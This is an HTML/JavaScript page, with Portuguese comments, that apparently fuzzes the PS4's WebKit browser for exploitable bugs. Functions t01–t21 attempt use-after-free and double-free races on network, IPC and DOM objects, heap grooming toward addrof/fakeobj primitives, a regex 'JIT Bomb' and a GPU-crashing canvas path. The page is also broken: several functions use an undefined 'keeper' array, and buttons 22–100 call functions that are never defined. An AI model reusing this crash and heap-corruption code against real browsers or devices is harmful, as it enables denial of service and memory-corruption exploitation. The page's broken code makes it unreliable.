<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 ELF Hunter (06-10)</title>
</head>
<body>

<h1>SUITE v900000: ELF HUNTER (PT.2)</h1>
<button onclick="run(t01)">01. bmalloc Heap Coalesce Stress</button>
<button onclick="run(t02)">02. NetworkDataTaskCurl Race (Abort)</button>
<button onclick="run(t03)">03. ResourceLoadStatisticsStore UAF</button>
<button onclick="run(t04)">04. IsoHeap Spray & Pray</button>
<button onclick="run(t05)">05. CompletionHandler Destructor Race</button>
<button onclick="run(t06)">06. JIT catastrophic backtracking (RegExp)</button>
<button onclick="run(t07)">07. ShadowHost remove() during shadow mutation</button>
<button onclick="run(t08)">08. FileReader huge blob + abort() race</button>
<button onclick="run(t09)">09. Canvas 2D Mega-Path (GPU Command Buffer)</button>
<button onclick="run(t10)">10. Event Bubbling + Recursive removeChild()</button>
<button onclick="run(t11)">11. ResourceStore Lifetime Race</button>
<button onclick="run(t12)">12. IPC CompletionHandler Double-Free</button>
<button onclick="run(t13)">13. Curl Data Task Type Confusion</button>
<button onclick="run(t14)">14. IsoHeap Object Alignment (FakeObj)</button>
<button onclick="run(t15)">15. Blob URL Store ID Confusion</button>
<button onclick="run(t16)">16. Curl Completion Object Destruction</button>
<button onclick="run(t17)">17. ArrayBuffer Transfer/Slice Race</button>
<button onclick="run(t18)">18. captureEvents() + Window Close</button>
<button onclick="run(t19)">19. ResourceStore Storage Access Race</button>
<button onclick="run(t20)">20. MessagePort Entanglement Corruption</button>
<button onclick="run(t21)">21. Statistics Store Ephemeral Session Race</button>
<button onclick="run(t22)">22. SharedBuffer Copy-On-Write Race</button>
<button onclick="run(t23)">23. ResourceStore postTask Queue Flood</button>
<button onclick="run(t24)">24. Network Metrics Performance API Race</button>
<button onclick="run(t25)">25. bmalloc IsoHeap Object Alignment</button>
<button onclick="run(t26)">26. Array.sort() JIT Type Confusion</button>
<button onclick="run(t27)">27. ImageBitmap Transfer/Close Race</button>
<button onclick="run(t28)">28. ServiceWorker Registration in Ephemeral Frame</button>
<button onclick="run(t29)">29. Blob URL Navigation & Revoke Race</button>
<button onclick="run(t30)">30. RegExp JIT Sticky Flag Side-Effect</button>
<button onclick="run(t31)">31. FormData Blob Upload vs Revoke</button>
<button onclick="run(t32)">32. Rope String Flattening vs GC</button>
<button onclick="run(t33)">33. MessagePort Post vs Iframe Nav</button>
<button onclick="run(t34)">34. ReadableStream Tee Cancel/Read Race</button>
<button onclick="run(t35)">35. Canvas.toBlob() vs Element Removal</button>
<button onclick="run(t36)">36. BroadcastChannel Message vs Close Race</button>
<button onclick="run(t37)">37. TypedArray Species Constructor Hijack</button>
<button onclick="run(t38)">38. XSLT Recursion Memory Corruption</button>
<button onclick="run(t39)">39. texImage2D Video vs Source Destruction</button>
<button onclick="run(t40)">40. JSON.parse Reviver Buffer Detach</button>
<button onclick="run(t41)">41. SharedWorker Creation vs Frame Destruction</button>
<button onclick="run(t42)">42. Intl.DateTimeFormat Getter Side-Effect</button>
<button onclick="run(t43)">43. decodeAudioData ArrayBuffer Detach</button>
<button onclick="run(t44)">44. DOMParser Stream vs Fetch Abort</button>
<button onclick="run(t45)">45. History pushState Cyclic Object Crash</button>
<button onclick="run(t46)">46. XHR Blob Fetch vs Revoke</button>
<button onclick="run(t47)">47. Worker Terminate with Pending Port</button>
<button onclick="run(t48)">48. FontFace.load() vs Delete</button>
<button onclick="run(t49)">49. ReadableStream Lock vs GetReader</button>
<button onclick="run(t50)">50. AnimationStart vs Element Removal</button>
<button onclick="run(t51)">51. Fetch Cache Write vs Abort</button>
<button onclick="run(t52)">52. IndexedDB Open in Ephemeral Frame</button>
<button onclick="run(t53)">53. bmalloc Huge Chunk Coalesce</button>
<button onclick="run(t54)">54. SendBeacon vs Page Unload</button>
<button onclick="run(t55)">55. Link Preload ResourceStore Flood</button>
<button onclick="run(t56)">56. Notification Close vs Worker Terminate</button>
<button onclick="run(t57)">57. FileReaderSync vs Worker Kill</button>
<button onclick="run(t58)">58. Custom Element Constructor Suicide</button>
<button onclick="run(t59)">59. Range.extractContents vs DOM Mutation</button>
<button onclick="run(t60)">60. WeakMap GC Survival Race</button>
<button onclick="run(t61)">61. AudioParam Ramp vs Disconnect</button>
<button onclick="run(t62)">62. ANGLE Instanced Arrays Buffer Drop</button>
<button onclick="run(t63)">63. postMessage Getter Object Mutation</button>
<button onclick="run(t64)">64. SVG animateTransform vs Target Remove</button>
<button onclick="run(t65)">65. TextDecoder Stream Buffer Detach</button>
<button onclick="run(t66)">66. Video Seek (Range Request) vs Destroy</button>
<button onclick="run(t67)">67. Canvas save() Stack vs Resize Reset</button>
<button onclick="run(t68)">68. postMessage Duplicate Transfer List</button>
<button onclick="run(t69)">69. IntersectionObserver vs Shadow Detach</button>
<button onclick="run(t70)">70. WebGL LinkProgram vs DetachShader</button>
<button onclick="run(t71)">71. TextTrackCue Change vs Video Remove</button>
<button onclick="run(t72)">72. Recursive Blob Construction Crash</button>
<button onclick="run(t73)">73. createPattern(Video) vs Source Destroy</button>
<button onclick="run(t74)">74. document.fonts.load() vs Clear()</button>
<button onclick="run(t75)">75. XHR ArrayBuffer Response Detach</button>
<button onclick="run(t76)">76. Blob Slice Recursion (bmalloc stress)</button>
<button onclick="run(t77)">77. Crypto.digest vs ArrayBuffer Transfer</button>
<button onclick="run(t78)">78. Slot Assignment vs Shadow Remove</button>
<button onclick="run(t79)">79. @counter-style Delete vs Render</button>
<button onclick="run(t80)">80. URLSearchParams Loop vs Delete</button>
<button onclick="run(t81)">81. Selection.addRange vs DOMNodeRemoved</button>
<button onclick="run(t82)">82. putImageData ArrayBuffer Detach</button>
<button onclick="run(t83)">83. Deeply Nested HTML Injection</button>
<button onclick="run(t84)">84. window.find() vs Element Removal</button>
<button onclick="run(t85)">85. Map Delete during Iteration</button>
<button onclick="run(t86)">86. Canvas Gradient AddStop vs Reset</button>
<button onclick="run(t87)">87. WebAssembly Memory Grow View Detach</button>
<button onclick="run(t88)">88. Select Options Length Truncate</button>
<button onclick="run(t89)">89. DOMMatrix.fromMatrix Getter Mutation</button>
<button onclick="run(t90)">90. Worker importScripts() vs Terminate</button>
<button onclick="run(t91)">91. WebGL DrawBuffers vs Texture Delete</button>
<button onclick="run(t92)">92. FileReader onprogress vs Blob Neuter</button>
<button onclick="run(t93)">93. FontFaceSet.ready vs Iframe Kill</button>
<button onclick="run(t94)">94. IDBTransaction vs DeleteDatabase</button>
<button onclick="run(t95)">95. WebSocket Huge Send vs Close</button>
<button onclick="run(t96)">96. XSLT Fragment Adopt vs Destroy</button>
<button onclick="run(t97)">97. Path2D addPath(self) Recursion</button>
<button onclick="run(t98)">98. HTMLElement.dataset Rope Flattening</button>
<button onclick="run(t99)">99. CSS calc() Deep Nesting vs Layout</button>
<button onclick="run(t100)">100. Blob Upload vs Worker Transfer Race</button>

<hr>
<div id="log">Aguardando...</div>
<div id="stage"></div>

<script>
    const log = document.getElementById('log');
    const stage = document.getElementById('stage');
    let spray = [];

    function run(func) {
        stage.innerHTML = ""; // Limpa palco
        spray = []; // Limpa spray anterior
        log.innerText = "Executando: " + func.name + "... SE TRAVAR, FUNCIONOU.";
        // Pequeno delay para o navegador renderizar o texto antes de morrer
        setTimeout(func, 100);
    }

// =================================================================
    // 01. bmalloc Heap Coalesce Stress
    // Alvo: bmalloc::PerProcess<...>::coalesce() (Encontrado no ELF)
    // Objetivo: Forçar o alocador a fundir blocos de memória livre (coalesce)
    // enquanto tentamos alocar objetos novos no meio do processo.
    // =================================================================
    function t01() {
        const output = [];
        // 1. Aloca muitos ArrayBuffers pequenos (cria fragmentação)
        for(let i=0; i<10000; i++) {
            output.push(new ArrayBuffer(128)); 
        }

        // 2. Libera memória de forma alternada (Buracos no Heap)
        // Isso força o 'bmalloc' a considerar fazer 'coalesce' dos buracos
        for(let i=0; i<output.length; i+=2) {
            output[i] = null;
        }

        // 3. Força Garbage Collection (Pressão)
        const pressure = new Uint8Array(1024 * 1024 * 50); // 50MB

        // 4. Tenta realocar nos buracos rapidamente
        // Se o 'coalesce' estiver rodando na thread do heap, isso causa race
        setTimeout(() => {
            for(let i=0; i<5000; i++) {
                output.push(new Float64Array(16)); // Tamanho similar
            }
            log.innerText = "bmalloc coalesce stress complete";
        }, 10);
    }

    // =================================================================
    // 02. NetworkDataTaskCurl Race
    // Alvo: WebKit::NetworkDataTaskCurl::curlDidReceiveData (Encontrado no ELF)
    // Objetivo: Iniciar um fetch (cURL), receber dados parciais e abortar
    // violentamente. Tenta fazer o callback C++ 'curlDidReceiveData' rodar
    // depois que o objeto JS já morreu.
    // =================================================================
    function t02() {
        const controller = new AbortController();
        const signal = controller.signal;

        // Fetch de um arquivo grande (usando cache bust)
        fetch(window.location.href + "?" + Math.random(), { signal })
            .then(response => {
                const reader = response.body.getReader();
                return reader.read().then(({ done, value }) => {
                    // Recebeu o primeiro chunk (curlDidReceiveData disparou)
                    
                    // AÇÃO: Aborta imediatamente
                    controller.abort();
                    
                    // Tenta forçar limpeza do objeto Request
                    log.innerText = "cURL Task Aborted mid-stream";
                });
            })
            .catch(e => {
                // Erro esperado de abort
            });
            
        // Spray para ocupar memória de rede liberada
        spray.push(new ArrayBuffer(1024 * 1024));
    }

    // =================================================================
    // 03. ResourceLoadStatisticsStore UAF
    // Alvo: WebKit::WebResourceLoadStatisticsStore (Encontrado no ELF)
    // Objetivo: Este objeto rastreia estatísticas de domínios. Vamos criar
    // iframes de múltiplos "domínios" (simulados) e destruir o histórico.
    // =================================================================
    function t03() {
        const frameContainer = document.createElement('div');
        document.body.appendChild(frameContainer);

        // Cria carga no StatisticsStore
        for(let i=0; i<50; i++) {
            const ifr = document.createElement('iframe');
            // Tenta engatilhar lógica de tracker protection ou stats
            ifr.src = "about:blank?id=" + i; 
            frameContainer.appendChild(ifr);
        }

        setTimeout(() => {
            // AÇÃO: Remove todos os iframes de uma vez
            frameContainer.innerHTML = "";
            
            // Tenta limpar o histórico/sessão se possível (simulado)
            // No PS4, navegar para "about:blank" pode liberar estruturas de página
            window.location.hash = "cleanup";
            
            log.innerText = "Resource Statistics Store Flooded & Cleared";
            spray.push(new Uint32Array(100000));
        }, 100);
    }

    // =================================================================
    // 04. IsoHeap Spray & Pray
    // Alvo: bmalloc_IsoHeap (Encontrado no ELF)
    // Objetivo: O IsoHeap separa tipos. Tentamos confundir Float64Array
    // com objetos JS simples que tenham o mesmo tamanho em bytes,
    // esperando que o bmalloc os coloque na mesma página de memória.
    // =================================================================
    function t04() {
        const structureA = [];
        const structureB = [];

        // Objeto JS com 4 propriedades (aprox 64 bytes header + dados)
        function Gadget(a, b, c, d) {
            this.a = a; this.b = b; this.c = c; this.d = d;
        }

        // Float64Array de tamanho similar
        for(let i=0; i<1000; i++) {
            // Cria buracos
            structureA.push(new Gadget(1.1, 2.2, 3.3, 4.4));
            structureB.push(new Float64Array(8)); // 8 * 8 bytes = 64 bytes
        }

        // Libera Structure A
        for(let i=0; i<1000; i++) {
            structureA[i] = null;
        }

        // Tenta realocar B em cima de A
        const conflict = [];
        for(let i=0; i<1000; i++) {
            conflict.push(new Float64Array(8));
        }

        log.innerText = "IsoHeap alignment attempted";
    }

    // =================================================================
    // 05. CompletionHandler Destructor Race
    // Alvo: CompletionHandler<void ()> (Encontrado no ELF)
    // Objetivo: Funções assíncronas no C++ usam CompletionHandlers.
    // Usamos MessageChannel (que é assíncrono e usa IPC) para criar
    // um handler pendente e fechamos a porta antes da conclusão.
    // =================================================================
    function t05() {
        const channel = new MessageChannel();
        const port1 = channel.port1;
        const port2 = channel.port2;

        port1.onmessage = () => {
            // Nunca deve chegar aqui se o exploit funcionar
            console.log("Too slow");
        };

        // Envia mensagem (cria Task e CompletionHandler no C++)
        port2.postMessage("RACE");

        // AÇÃO: Destrói as portas imediatamente
        // O WebKit tenta executar o Handler de "mensagem enviada", mas o objeto morreu
        // A string 'destroyResourceLoadStatisticsStore' sugere que destructors são complexos
        port1.close();
        port2.close();
        
        // Tenta fechar o canal global
        try { channel.close(); } catch(e){}

        log.innerText = "IPC CompletionHandler race triggered";
        spray.push(new ArrayBuffer(1024 * 1024));
    }

    // =================================================================
    // 06. JIT catastrophic backtracking (RegExp)
    // Alvo: JavaScriptCore JIT (Símbolos 'jit', 'createVM' no ELF)
    // Objetivo: Explora como o motor de RegEx lida com retrocesso aninhado.
    // Isso força um consumo exponencial de CPU e pilha na thread JS,
    // podendo levar a um crash do processo por watchdog timeout ou stack overflow.
    // =================================================================
    function t06() {
        // O padrão (a+)+ força o motor a tentar todas as combinações possíveis
        // de 'a's repetidos.
        const evilRegex = /^(a+)+$/;
        
        // Uma string de 30 'a's é suficiente para travar motores antigos por segundos.
        // 50+ pode crashar.
        const input = "a".repeat(50) + "!"; // O '!' final força o backtracking máximo

        log.innerText += "\nIniciando JIT Bomb... (O console deve congelar)";
        
        try {
            // Esta linha deve travar a thread principal
            evilRegex.test(input);
            log.innerText = "Falha: O motor sobreviveu (RegEx otimizado?)";
        } catch(e) {
             log.innerText = "Erro (Stack Overflow?): " + e.message;
        }
    }

    // =================================================================
    // 07. Shadow DOM Detach Race
    // Alvo: WebCore DOM (Complexidade de destruição de ShadowRoot)
    // Objetivo: O Shadow DOM cria sub-árvores complexas. Modificamos a sombra
    // e removemos o hospedeiro (host) simultaneamente para causar UAF na engine.
    // =================================================================
    function t07() {
        const host = document.createElement('div');
        stage.appendChild(host);
        
        // Cria shadow root (modo open para acesso fácil)
        const shadow = host.attachShadow({mode: 'open'});
        const child = document.createElement('span');
        child.textContent = "Shadow Content";
        shadow.appendChild(child);

        // Loop de mutação dentro da sombra
        const interval = setInterval(() => {
            child.textContent = Math.random();
        }, 0);

        // AÇÃO: Remove o host abruptamente
        setTimeout(() => {
            clearInterval(interval);
            host.remove();
            
            // Spray para preencher a memória onde a ShadowTree estava
            spray.push(new ArrayBuffer(1024 * 1024));
            
            log.innerText = "Shadow Host removed during internal mutation";
        }, 100);
    }

    // =================================================================
    // 08. FileReader huge blob + abort() race
    // Alvo: WebKit::NetworkDataTaskCurl / IO Backend
    // Objetivo: O ELF mostrou uso de cURL. A leitura de Blobs gigantes usa
    // threads de I/O em segundo plano. Abortar a leitura no meio força o
    // sistema a cancelar tarefas pendentes, ponto comum de falhas de sincronia.
    // =================================================================
    function t08() {
        // Cria um Blob massivo (100MB de dados virtuais)
        const hugeData = new Uint8Array(1024 * 1024 * 100);
        const blob = new Blob([hugeData]);
        const reader = new FileReader();

        reader.onloadstart = () => {
            log.innerText += "\nLeitura iniciada...";
            
            // AÇÃO: Aborta violentamente assim que começa
            // Tenta pegar o momento entre a thread principal pedir os dados
            // e a thread de I/O começar a entregar.
            setTimeout(() => {
                reader.abort();
                log.innerText += "\nLeitura ABORTADA.";
                
                // Pressão no GC para limpar os buffers de I/O órfãos
                spray.push(new ArrayBuffer(1024 * 1024 * 50));
            }, 10); // Janela de tempo curta
        };

        reader.onerror = () => log.innerText = "Erro no reader (Esperado)";
        reader.onabort = () => log.innerText = "Abortado limpo (Falha no teste)";

        // Inicia leitura pesada
        reader.readAsArrayBuffer(blob);
    }

    // =================================================================
    // 09. Canvas 2D Mega-Path (GPU Command Buffer)
    // Alvo: libSceGnm (Driver GPU) via Canvas
    // Objetivo: Criar um caminho vetorial tão complexo que estoure o buffer
    // de comandos que o WebKit envia para a GPU, causando um crash no driver.
    // =================================================================
    function t09() {
        const canvas = document.createElement('canvas');
        canvas.width = 1024;
        canvas.height = 1024;
        stage.appendChild(canvas);
        const ctx = canvas.getContext('2d');

        ctx.beginPath();
        log.innerText += "\nGerando caminho complexo (Aguarde travamento)...";

        // Adiciona 200.000 segmentos ao caminho.
        // Versões antigas do WebKit tinham limites hardcoded para isso.
        for(let i=0; i < 200000; i++) {
            const x = Math.random() * canvas.width;
            const y = Math.random() * canvas.height;
            // Alterna entre linha e curva para complexidade máxima
            if (i % 2 === 0) {
                ctx.lineTo(x, y);
            } else {
                ctx.quadraticCurveTo(x, y, x/2, y/2);
            }
        }

        // AÇÃO: Força a rasterização de tudo de uma vez
        // É aqui que o comando gigante é enviado à GPU.
        ctx.fill();
        
        log.innerText = "Comando de Fill enviado (Se ainda estiver lendo isso, não crashou)";
    }

    // =================================================================
    // 10. Event Bubbling + Recursive removeChild()
    // Alvo: WebCore Event Handler (Gestão da árvore durante eventos)
    // Objetivo: Um elemento remove seu próprio pai enquanto um evento
    // está subindo (bubbling) pela hierarquia. O navegador precisa decidir
    // para onde propagar o evento se o caminho sumiu.
    // =================================================================
    function t10() {
        const grandParent = document.createElement('div');
        const parent = document.createElement('div');
        const child = document.createElement('button');
        child.innerText = "CLICK ME TO DIE";

        grandParent.appendChild(parent);
        parent.appendChild(child);
        stage.appendChild(grandParent);

        // Handler no elemento que será removido
        parent.addEventListener('click', (e) => {
            log.innerText += "\nParent click processed.";
        });

        // Handler no filho que dispara a destruição
        child.addEventListener('click', (e) => {
            log.innerText += "\nChild removing parent...";
            // AÇÃO: Remove o pai. O evento 'click' ainda precisa subir para 'grandParent'
            // mas o caminho foi quebrado.
            grandParent.removeChild(parent);
            
            // Spray imediato
            spray.push(new Uint32Array(10000).fill(0xDEADDEAD));
        });

        log.innerText = "Clicando no elemento armadilha...";
        child.click();
    }
 // =================================================================
    // 11. ResourceStore Lifetime Race
    // Alvo: WebKit::WebResourceLoadStatisticsStore::destroyResourceLoadStatisticsStore
    // Vulnerabilidade Potencial: UAF (Use-After-Free).
    // Lógica: O JSON mostra que esse Store tem um destruidor complexo. 
    // Criamos uma navegação pesada (Iframes) que registra estatísticas, 
    // interrompemos a carga (stop) e navegamos para 'about:blank' imediatamente.
    // O objetivo é acessar o 'Store' depois que ele foi marcado para destruição.
    // =================================================================
    function t11() {
        const f = document.createElement('iframe');
        document.body.appendChild(f);
        
        // 1. Inicia carga que gera estatísticas (ITP)
        f.src = window.location.href + "?stat_gen=" + Math.random();
        
        f.onload = () => {
            // 2. No momento do load, forçamos uma mudança de estado
            // O Store deve registrar essa conclusão.
            try {
                // Remove do DOM (Destrói o RenderFrame no C++)
                f.remove();
                
                // 3. Força Garbage Collection imediato
                // Se o Store guardou uma referência "fraca" (WeakPtr) que não foi limpa...
                const b = new ArrayBuffer(1024 * 1024 * 10);
                
                // 4. Tenta acessar histórico ou estatísticas via API relacionada
                // (performance.getEntries pode tocar estruturas similares)
                const p = performance.getEntries();
                
                log.innerText = "Race condition iniciada no StatisticsStore.";
            } catch(e) {}
        };
    }

    // =================================================================
    // 12. IPC CompletionHandler Double-Free
    // Alvo: CompletionHandler<void ()> (Visto no JSON)
    // Vulnerabilidade Potencial: Double-Free.
    // Lógica: Handlers de conclusão em C++ (&&) usam semântica de movimento.
    // Se conseguirmos fazer o navegador tentar executar o callback de sucesso 
    // E o callback de erro ao mesmo tempo, podemos corromper a heap.
    // =================================================================
    function t12() {
        const channel = new MessageChannel();
        
        // Cria um Worker que vai segurar uma porta
        const blob = new Blob([`
            onmessage = function(e) {
                // Não responde imediatamente, segura o handler
                const port = e.data;
                setTimeout(() => {
                    port.postMessage("LATE_RESPONSE");
                    close(); // Fecha contexto worker
                }, 10);
            }
        `], {type: 'application/javascript'});
        
        const worker = new Worker(URL.createObjectURL(blob));
        
        // Envia porta (Transfere ownership)
        worker.postMessage(channel.port2, [channel.port2]);
        
        // RACE:
        // 1. O Worker vai tentar responder em 10ms.
        // 2. Nós fechamos o canal local em 10ms (simultaneamente).
        // 3. O WebKit tem que decidir quem destrói o Handler.
        setTimeout(() => {
            channel.port1.close();
            worker.terminate(); // Mata o processo dono da outra ponta
            
            // Spray para ocupar o lugar do Handler liberado
            for(let i=0; i<1000; i++) keeper.push(new ArrayBuffer(32));
            
            log.innerText = "Tentativa de Double-Free no IPC Handler.";
        }, 10);
    }

    // =================================================================
    // 13. Curl Data Task Type Confusion
    // Alvo: WebKit::NetworkDataTaskCurl::curlDidReceiveData
    // Vulnerabilidade Potencial: Type Confusion / Info Leak.
    // Lógica: O backend cURL entrega dados brutos. Se mudarmos o 'responseType'
    // do XHR *durante* o recebimento dos dados, o WebKit pode escrever os dados
    // do cURL num buffer do tipo errado (ex: tratar String como ArrayBuffer).
    // =================================================================
    function t13() {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', window.location.href); // Auto-request
        
        // Começa como texto
        xhr.responseType = 'text';
        
        xhr.onprogress = () => {
            // AÇÃO: No meio do stream de dados
            if(xhr.responseText.length > 10) {
                try {
                    // Tenta mudar o tipo dinamicamente (alguns browsers bloqueiam, 
                    // mas bugs de implementação permitem race aqui)
                    xhr.responseType = 'arraybuffer';
                    
                    // Se falhar a mudança, tentamos confundir o parser acessando responseXML
                    const leak = xhr.responseXML; 
                } catch(e) {}
            }
        };
        
        xhr.onload = () => {
            log.innerText = "XHR Type Confusion Cycle Complete";
        };
        
        xhr.send();
    }

    // =================================================================
    // 14. IsoHeap Object Alignment (FakeObj)
    // Alvo: bmalloc_IsoHeap (Isolamento de memória)
    // Vulnerabilidade Potencial: Heap Overflow / FakeObj primitive.
    // Lógica: Tentar alinhar objetos JS (Objects) e objetos TypedArray na memória.
    // Se conseguirmos um Overflow, queremos sobrescrever o header do TypedArray
    // para apontar para um endereço arbitrário (primitiva addrof/fakeobj).
    // =================================================================
    function t14() {
        // Estrutura alvo: Float64Array (header + data)
        const target = new Float64Array(16);
        
        // Estrutura spray: Objetos com propriedades inline (tamanho similar)
        // Tentamos preencher os buracos ao redor do 'target'
        for(let i=0; i<5000; i++) {
            const o = {a: 1.1, b: 2.2, c: 3.3, d: 4.4}; // ~32-64 bytes
            keeper.push(o);
        }
        
        // Cria buracos propositais
        for(let i=0; i<keeper.length; i+=10) {
            keeper[i] = null;
        }
        
        // Tenta forçar alocação do target nos buracos
        const target_copies = [];
        for(let i=0; i<500; i++) {
            target_copies.push(new Float64Array(16));
        }
        
        log.innerText = "Heap Grooming para IsoHeap Bypass realizado.";
        // Nota: O exploit real exigiria corrupção de memória prévia, 
        // este teste prepara o terreno (Feng Shui).
    }

    // =================================================================
    // 15. Blob URL Store ID Confusion
    // Alvo: Gerenciamento de IDs de Blob no WebCore.
    // Vulnerabilidade Potencial: ID Confusion / UAF.
    // Lógica: Criamos um Blob, geramos URL, revogamos, e imediatamente
    // criamos outro Blob na esperança de reutilizar o mesmo ID interno,
    // mas acessando via referência antiga.
    // =================================================================
    function t15() {
        const b1 = new Blob(["AAAA"]);
        const u1 = URL.createObjectURL(b1);
        
        const img = document.createElement('img');
        
        // Carregamento iniciado
        img.src = u1;
        
        // Revoga imediatamente (Libera ID no backend)
        URL.revokeObjectURL(u1);
        
        // Cria novo blob rapidamente (Tenta pegar o mesmo slot/ID de memória)
        const b2 = new Blob(["BBBB"]);
        const u2 = URL.createObjectURL(b2);
        
        // Acessa a imagem que estava carregando u1
        // Se o backend confundiu os IDs, a imagem pode carregar b2 ou lixo de memória
        document.body.appendChild(img);
        
        img.onerror = () => log.innerText = "Falha no load (Esperado)";
        img.onload = () => log.innerText = "SUCESSO: Imagem carregou após revoke! (Potencial UAF)";
    }
// =================================================================
    // 16. Curl Completion Object Destruction
    // Alvo: WebKit::NetworkDataTaskCurl::curlDidComplete (Offset 0x2b11bc9 no JSON)
    // Vulnerabilidade: UAF.
    // Lógica: O backend cURL chama 'curlDidComplete' quando o download termina.
    // Se usarmos 'fetch' com um sinal de aborto e dispararmos o aborto
    // EXATAMENTE quando o download chega a 100% mas antes do callback C++,
    // o objeto de Request pode ser liberado antes do cURL terminar de escrever as métricas.
    // =================================================================
    function t16() {
        const controller = new AbortController();
        
        // Fetch em um blob pequeno local para ser rápido
        fetch(window.location.href, { signal: controller.signal })
            .then(r => r.blob())
            .then(blob => {
                // Chegamos no 'didComplete' JS. 
                // O C++ pode ainda estar limpando a stack.
                
                // AÇÃO: Força limpeza imediata
                controller.abort();
                
                // Spray para sobrescrever a struct de métricas de rede
                for(let i=0; i<1000; i++) keeper.push(new ArrayBuffer(64));
                
                log.innerText = "Tentativa de Race no fechamento do cURL.";
            });
    }

    // =================================================================
    // 17. ArrayBuffer Transfer/Slice Race
    // Alvo: bmalloc::PerProcess...coalesce (Offset 0x2e18e24 no JSON)
    // Vulnerabilidade: Heap Corruption.
    // Lógica: 'postMessage' com 'transfer' deve "neuter" (esvaziar) o ArrayBuffer imediatamente.
    // O 'bmalloc' então tenta fundir (coalesce) a memória livre.
    // Tentamos criar uma referência secundária (via DataView) e acessá-la
    // no mesmo ciclo de clock da transferência.
    // =================================================================
    function t17() {
        const buffer = new ArrayBuffer(1024 * 1024);
        const view = new DataView(buffer);
        
        const worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
        
        try {
            // AÇÃO: Define um getter que dispara a transferência
            // Tentamos enganar o mecanismo de travamento do JSC
            const obj = {};
            Object.defineProperty(obj, 'buf', {
                get: function() {
                    worker.postMessage(buffer, [buffer]); // Transfere (Free)
                    return 0x41414141; 
                }
            });

            // Acesso que pode causar conflito se o compilador JIT reordenar instruções
            // Tentamos ler a view DEPOIS que a transferência começou mas antes de acabar
            const val = view.getUint8(0) + obj.buf;
            
            log.innerText = "Buffer Transfer Race executado.";
        } catch(e) {
            log.innerText = "Race falhou (JSC protegeu): " + e.message;
        }
    }

    // =================================================================
    // 18. Legacy captureEvents() + Window Close
    // Alvo: captureEvents (String encontrada no ELF - Relíquia Netscape)
    // Vulnerabilidade: State Confusion / Pointer Dereference.
    // Lógica: Essa API antiga instrui a janela a capturar todos os eventos de um tipo.
    // Se fecharmos a janela, o Kernel do WebKit ainda pode tentar rotear eventos para ela
    // por causa dessa flag legada que raramente é limpa corretamente.
    // =================================================================
    function t18() {
        const w = window.open("", "_blank", "width=100,height=100");
        
        if(w) {
            setTimeout(() => {
                try {
                    // Ativa captura de eventos legada (se existir no binding)
                    if(w.captureEvents) {
                        w.captureEvents(Event.MOUSEMOVE | Event.CLICK);
                    }
                    
                    // Fecha a janela
                    w.close();
                    
                    // Simula eventos globais que o kernel pode tentar rotear
                    document.body.click();
                    
                    log.innerText = "Legacy Event Capture ativado em janela morta.";
                } catch(e) { log.innerText = "API captureEvents removida?"; }
            }, 200);
        } else {
            log.innerText = "Pop-up bloqueado.";
        }
    }

    // =================================================================
    // 19. ResourceStore Storage Access Race
    // Alvo: WebKit::WebResourceLoadStatisticsStore (JSON Offset 0x2b113d6)
    // Vulnerabilidade: Logic Error / UAF.
    // Lógica: O Store gerencia permissões de cookies/storage (ITP).
    // Usamos 'document.requestStorageAccess()' dentro de um Iframe sandboxed.
    // Quando a promessa resolve (ou rejeita), o iframe já foi removido.
    // =================================================================
    function t19() {
        const ifr = document.createElement('iframe');
        ifr.sandbox = "allow-scripts allow-same-origin"; // Sandbox restrito
        document.body.appendChild(ifr);
        
        const doc = ifr.contentDocument;
        const script = doc.createElement('script');
        script.textContent = `
            if(document.requestStorageAccess) {
                document.requestStorageAccess().then(() => {
                    // Callback sucesso
                }).catch(() => {
                    // Callback erro
                });
            }
        `;
        
        doc.body.appendChild(script);
        
        // AÇÃO: Remove o iframe imediatamente.
        // O pedido de acesso é assíncrono (vai ao processo UI e volta).
        // Quando voltar, o contexto do iframe sumiu.
        setTimeout(() => {
            ifr.remove();
            
            // Spray para corromper o contexto de segurança
            for(let i=0; i<500; i++) keeper.push(new Float64Array(100));
            
            log.innerText = "Storage Access solicitado em Iframe morto.";
        }, 0);
    }

    // =================================================================
    // 20. MessagePort Entanglement Corruption
    // Alvo: IPC System (CompletionHandlers)
    // Vulnerabilidade: Port Entanglement Confusion.
    // Lógica: MessagePorts podem ser "entrelaçadas" (entangled).
    // Enviamos a Porta A pela Porta B, e a Porta B pela Porta A (ciclo).
    // O Garbage Collector do WebKit tem dificuldade com ciclos de portas cross-process.
    // =================================================================
    function t20() {
        const channel1 = new MessageChannel();
        const channel2 = new MessageChannel();
        
        // Cria ciclo complexo de propriedade
        // Porta 1 do Canal 1 recebe Porta 1 do Canal 2
        channel1.port1.postMessage("cycle", [channel2.port1]);
        
        // Porta 2 do Canal 2 recebe Porta 2 do Canal 1
        channel2.port2.postMessage("cycle", [channel1.port2]);
        
        // AÇÃO: Fecha tudo e remove referências
        // O WebKit tenta desenrolar o grafo de portas. Se falhar, leak ou UAF.
        channel1.port1.close();
        channel2.port2.close();
        
        // Alocação massiva para forçar o GC a rodar e visitar os portos mortos
        let pressure = [];
        for(let i=0; i<10000; i++) pressure.push(new ArrayBuffer(1024));
        
        log.innerText = "Ciclo de MessagePort criado e fechado.";
    }
// =================================================================
    // 21. Statistics Store Ephemeral Session Race
    // Alvo: WebKit::WebResourceLoadStatisticsStore::destroyResourceLoadStatisticsStore
    // Contexto: O JSON menciona 'ResourceLoadStatistics::IsEphemeral'.
    // Vulnerabilidade: UAF na destruição de sessões temporárias.
    // Lógica: Criamos iframes com atributos que sugerem sessões privadas/efêmeras
    // (sandbox restrito), geramos tráfego de estatísticas e destruímos o frame.
    // O objetivo é fazer o 'destroyResourceLoadStatisticsStore' rodar enquanto
    // dados ainda estão sendo processados.
    // =================================================================
    function t21() {
        const ifr = document.createElement('iframe');
        // 'allow-same-origin' sem 'allow-scripts' às vezes cria contextos únicos
        ifr.sandbox = "allow-same-origin"; 
        document.body.appendChild(ifr);
        
        // Força criação de estrutura de estatísticas (ResourceLoadStatistics)
        // Navegando para URL que gera cookies/storage events
        ifr.src = window.location.href + "#ephemeral" + Math.random();
        
        setTimeout(() => {
            // AÇÃO: Destruição do contexto
            // O WebKit deve chamar o destrutor do Store associado a este frame
            ifr.remove();
            
            // Spray para preencher a memória do objeto Store liberado
            for(let i=0; i<2000; i++) keeper.push(new ArrayBuffer(128));
            
            log.innerText = "Sessão Efêmera destruída durante carga.";
        }, 10);
    }

